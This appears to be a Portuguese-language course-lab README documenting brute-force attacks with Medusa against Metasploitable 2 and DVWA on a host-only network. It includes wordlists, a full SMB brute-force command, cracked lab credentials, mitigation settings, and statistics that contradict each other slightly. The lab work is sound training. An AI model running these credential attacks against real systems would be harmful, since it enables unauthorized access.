# 🔐 Projeto DIO: Ataques de Força Bruta com Kali Linux e Medusa

## 📖 Descrição do Projeto
Implementação prática de cenários de ataques de força bruta utilizando **Kali Linux** e **Medusa** contra ambientes vulneráveis (**Metasploitable 2** e **DVWA**), com documentação completa dos procedimentos e medidas de mitigação.

> ⚠️ **AVISO LEGAL**: Este projeto foi realizado em ambiente controlado para fins educacionais. Todas as técnicas devem ser usadas apenas em sistemas onde você tem autorização explícita.

## 🎯 Objetivos do Desafio

- [x] Configurar ambiente de laboratório com VMs
- [x] Executar ataques de força bruta em múltiplos serviços
- [x] Documentar procedimentos e resultados
- [x] Propor medidas de mitigação
- [x] Compartilhar conhecimento adquirido

## 🛠️ Tecnologias Utilizadas

- **Kali Linux** - Sistema de penetração
- **Medusa** - Ferramenta de força bruta
- **Metasploitable 2** - Ambiente vulnerável
- **DVWA** - Aplicação web vulnerável
- **VirtualBox** - Virtualização
- **Bash Scripting** - Automação

## 🏗️ Configuração do Ambiente

### Topologia da Rede:

    Kali Linux (Atacante)
    ↓
    VirtualBox Host-Only Network
    ↓  
    Metasploitable 2 (Alvo)
        ├── FTP (porta 21)
        ├── SSH (porta 22) 
        ├── HTTP/DVWA (porta 80)
        └── SMB (porta 445)


# ⚔️ Ataques Realizados
## 1. 🗂️ Ataque FTP (Porta 21)

| **Ataque:** | **Logs do ataque simples:**
| --- | --- |
| ![Medusa Ataque FTP](screenshots/medusaFtp.png) | ![Medusa FTP](screenshots/logsFtpSimples.png) |

| **Validação de Acesso:** |
| --- | 
| ![valifacaoAcesso](screenshots/ftpSucesso.png) |


Wordlists:

    # ftp_users.txt
    msfadmin
    admin
    root
    anonymous
    test
    user

    # ftp_passwords.txt  
    msfadmin
    password
    123456
    admin
    12345

Resultado:

    ✅ ACCOUNT FOUND: [ftp] Host: 192.168.122.128 User: msfadmin Password: msfadmin [SUCCESS]

## 2. 🌐 Ataque HTTP/DVWA (Porta 80)

| **Comando em Execução:** | **Logs do ataque:** |
| --- | --- |
| ![Medusa DVWA](screenshots/medusaDvwa.png) | ![DVWA Logs](screenshots/dvwaLogs.png) |


## 3. 💻 Ataque SMB (Porta 445)

| **Ataque em Andamento:** | **Descoberta de Compartilhamentos:**
| --- | --- |
| ![Medusa SMB](screenshots/medusaSmb.png) | ![SMB Shares](screenshots/validaçaoSmb.png) |

| **Acesso Confirmado:** |
| --- |
| ![SMB Access](screenshots/validaçao2Smb.png) |


Comando:

    medusa -h 192.168.122.128 -U wordlists/smb_users.txt -P wordlists/smb_passwords.txt -M smbnt -t 2 -f -O logs/smb_attack.log


Resultado:

    ✅ ACCOUNT FOUND: [smbnt] Host: 192.168.122.128 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]


📊 Resultados Obtidos
Serviço	Credenciais Comprometidas	Nível de Acesso	Tempo
FTP	1	Usuário normal	~30s
HTTP/DVWA	5	Aplicação web	~45s
SMB	1	Acesso ADMIN	~60s
Estatísticas

    - Total de credenciais comprometidas: 3

    - Serviços vulneráveis: 3

    - Taxa de sucesso: 100% nos serviços testados


# 🛡️ Medidas de Mitigação
Para Administradores de Sistema

## 🔒 FTP

    # Instalar e configurar fail2ban
    sudo apt install fail2ban

    # /etc/fail2ban/jail.local
    [vsftpd]
    enabled = true
    maxretry = 3
    bantime = 600


## 🔒 SSH

    # /etc/ssh/sshd_config
    PasswordAuthentication no
    PubkeyAuthentication yes
    PermitRootLogin no
    MaxAuthTries 3

## 🔒 Políticas de Senha

- Implementar senhas complexas (mínimo 12 caracteres)
- Exigir alteração periódica
- Bloquear contas após 5 tentativas falhas


## 🔒 DVWA/Formulários de Login

    <?php
    // Implementar CAPTCHA
    // Limitar tentativas por IP
    // Atraso progressivo entre tentativas
    session_start();

    if (!isset($_SESSION['login_attempts'])) {
        $_SESSION['login_attempts'] = 0;
    }

    if ($_SESSION['login_attempts'] >= 3) {
        sleep(pow(2, $_SESSION['login_attempts'] - 3));
    }
    ?>


## 📁 Estrutura do Projeto

    projetoForçaBruta/
    ├── 📄 README.md
    ├── 📁 wordlists/
    │   ├── ftp_users.txt
    │   ├── ftp_passwords.txt
    │   ├── dvwa_users.txt
    │   ├── dvwa_passwords.txt
    │   ├── smb_users.txt
    │   └── smb_passwords.txt
    ├── 📁 logs/
    │   ├── ftp_attack.log
    │   ├── dvwa_attack.log
    │   └── smb_attack.log
    └── 📁 screenshots/
        ├── ftp_success.png
        ├── dvwa_access.png
        └── smb_admin_access.png


## 📄 Licença

Este projeto está sob a licença MIT. Veja o arquivo LICENSE para detalhes.
